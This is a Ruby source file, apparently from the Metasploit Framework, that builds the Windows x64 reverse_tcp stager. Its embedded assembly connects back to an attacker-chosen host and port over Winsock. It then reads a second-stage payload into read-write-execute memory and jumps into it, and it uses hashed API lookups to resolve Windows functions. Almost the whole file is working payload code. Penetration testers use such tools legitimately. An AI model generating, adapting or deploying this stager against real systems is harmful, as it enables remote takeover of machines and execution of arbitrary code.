# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/x64/send_uuid'
require 'msf/core/payload/windows/x64/block_api'
require 'msf/core/payload/windows/x64/exitfunk'

module Msf

###
#
# Complex reverse_tcp payload generation for Windows ARCH_X86_64
#
###

module Payload::Windows::ReverseTcp_x64

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::SendUUID_x64
  include Msf::Payload::Windows::BlockApi_x64
  include Msf::Payload::Windows::Exitfunk_x64

  #
  # Register reverse_tcp specific options
  #
  def initialize(*args)
    super
  end

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned 
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop rbp
      #{asm_reverse_tcp(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # Reliability adds 10 bytes for recv error checks
    space += 10

    space += uuid_required_size if include_send_uuid

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Fixnum] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_reverse_tcp(opts={})

    # TODO: reliability coming later
    reliable     = opts[:reliable]
    retry_count  = [opts[:retry_count].to_i, 1].max
    encoded_port = [opts[:port].to_i,2].pack("vn").unpack("N").first
    encoded_host = Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
    encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]

    asm = %Q^
      reverse_tcp:
        ; setup the structures we need on the stack...
        mov r14, 'ws2_32'
        push r14               ; Push the bytes 'ws2_32',0,0 onto the stack.
        mov r14, rsp           ; save pointer to the "ws2_32" string for LoadLibraryA call.
        sub rsp, #{408+8}      ; alloc sizeof( struct WSAData ) bytes for the WSAData
                               ; structure (+8 for alignment)
        mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.
        mov r12, #{encoded_host_port}
        push r12               ; host, family AF_INET and port
        mov r12, rsp           ; save pointer to sockaddr struct for connect call
      ; perform the call to LoadLibraryA...
        mov rcx, r14           ; set the param for the library to load
        mov r10d, 0x0726774C   ; hash( "kernel32.dll", "LoadLibraryA" )
        call rbp               ; LoadLibraryA( "ws2_32" )
      ; perform the call to WSAStartup...
        mov rdx, r13           ; second param is a pointer to this stuct
        push 0x0101            ;
        pop rcx                ; set the param for the version requested
        mov r10d, 0x006B8029   ; hash( "ws2_32.dll", "WSAStartup" )
        call rbp               ; WSAStartup( 0x0101, &WSAData );
      ; perform the call to WSASocketA...
        push rax               ; if we succeed, rax wil be zero, push zero for the flags param.
        push rax               ; push null for reserved parameter
        xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure
        xor r8, r8             ; we do not specify a protocol
        inc rax                ;
        mov rdx, rax           ; push SOCK_STREAM
        inc rax                ;
        mov rcx, rax           ; push AF_INET
        mov r10d, 0xE0DF0FEA   ; hash( "ws2_32.dll", "WSASocketA" )
        call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
        mov rdi, rax           ; save the socket for later
      ; perform the call to connect...
        push 16                ; length of the sockaddr struct
        pop r8                 ; pop off the third param
        mov rdx, r12           ; set second param to pointer to sockaddr struct
        mov rcx, rdi           ; the socket
        mov r10d, 0x6174A599   ; hash( "ws2_32.dll", "connect" )
        call rbp               ; connect( s, &sockaddr, 16 );
        ; restore RSP so we dont have any alignment issues with the next block...
        add rsp, #{408+8+8*4+32*4} ; cleanup the stack allocations
    ^

    asm << asm_send_uuid if include_send_uuid

    asm << %Q^
      recv:
        ; Receive the size of the incoming second stage...
        sub rsp, 16            ; alloc some space (16 bytes) on stack for to hold the second stage length
        mov rdx, rsp           ; set pointer to this buffer
        xor r9, r9             ; flags
        push 4                 ; 
        pop r8                 ; length = sizeof( DWORD );
        mov rcx, rdi           ; the saved socket
        mov r10d, 0x5FC8D902   ; hash( "ws2_32.dll", "recv" )
        call rbp               ; recv( s, &dwLength, 4, 0 );
        add rsp, 32            ; we restore RSP from the api_call so we can pop off RSI next
        ; Alloc a RWX buffer for the second stage
        pop rsi                ; pop off the second stage length
        push 0x40              ; 
        pop r9                 ; PAGE_EXECUTE_READWRITE
        push 0x1000            ; 
        pop r8                 ; MEM_COMMIT
        mov rdx, rsi           ; the newly recieved second stage length.
        xor rcx, rcx           ; NULL as we dont care where the allocation is.
        mov r10d, 0xE553A458   ; hash( "kernel32.dll", "VirtualAlloc" )
        call rbp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
        mov rbx, rax           ; rbx = our new memory address for the new stage
        mov r15, rax           ; save the address so we can jump into it later
      read_more:               ;
        xor r9, r9             ; flags
        mov r8, rsi            ; length
        mov rdx, rbx           ; the current address into our second stages RWX buffer
        mov rcx, rdi           ; the saved socket
        mov r10d, 0x5FC8D902   ; hash( "ws2_32.dll", "recv" )
        call rbp               ; recv( s, buffer, length, 0 );
        add rbx, rax           ; buffer += bytes_received
        sub rsi, rax           ; length -= bytes_received
        test rsi, rsi          ; test length
        jnz read_more          ; continue if we have more to read
        jmp r15                ; return into the second stage
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

end

end
